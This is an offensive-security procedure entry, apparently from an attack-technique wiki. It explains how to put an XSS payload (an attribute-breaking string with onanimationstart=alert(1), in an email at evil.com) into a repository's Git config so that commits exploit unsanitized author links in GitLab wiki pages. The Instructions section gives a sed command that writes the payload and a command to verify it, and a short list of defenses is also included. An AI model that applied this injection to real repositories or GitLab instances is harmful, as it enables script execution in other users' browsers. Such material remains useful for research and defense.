---
tags:
  - git-config
  - xss
  - injection
type: procedure
tools:
  - '[[tools/Git]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/edit-git-config-email]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
sub_techniques: []
id: 4992eac2-9153-4efb-80c3-e3abddf92ea6
created_at: '2025-12-13T23:52:55.063Z'
updated_at: '2025-12-13T23:52:55.063Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Inject Malicious Email into Git Config

## Summary

This procedure modifies the local Git configuration file to set a crafted author email containing XSS payload attributes, which will be used in commits to exploit unsanitized rendering in GitLab wiki pages.

## Description

GitLab derives the author_url from the commit author's email in wiki_page_version.rb and marks it HTML safe in show.html.haml, allowing attribute injection into the <a> tag (e.g., onanimationstart=alert(1)). The payload is set locally in .git/config under [user] email, affecting all subsequent commits in this repo.

## Requirements

1. Cloned Git repository directory
2. Text editor or sed for config modification
3. Understanding of HTML attribute injection for XSS

## Defense

Defensive measures and detection strategies:

- Sanitize author metadata in wiki rendering (e.g., escape HTML in author_url)
- Validate Git config emails against known domains in CI/CD pipelines
- Log and alert on commits with suspicious author emails

## Objectives

1. Embed XSS payload in commit metadata
2. Ensure payload survives to wiki page render
3. Enable client-side execution without direct JS input

## Instructions

### Step 1: Edit Git Config File

**Context**: Locate and modify the [user] section in .git/config to inject the malicious email payload.

**Command** ([[commands/edit-git-config-email]]):
```bash
sed -i '/\[user\]/,/^$/ { /email =/c\\temail = anyname@evil.com\" onanimationstart=alert(1) //' .git/config
```

> This replaces the email line with a payload that closes the href attribute and adds an event handler. Expected output: No errors, config file updated.

### Step 2: Verify Configuration

**Context**: Confirm the malicious email is set for local commits.

**Command** (git config):
```bash
git config --local user.email
```

> Output should display the full payload string, indicating successful injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/edit-git-config-email]]

## Tools Used

- [[tools/Git]]

## Tags

- [[git-config]]
- [[xss]]
- [[injection]]
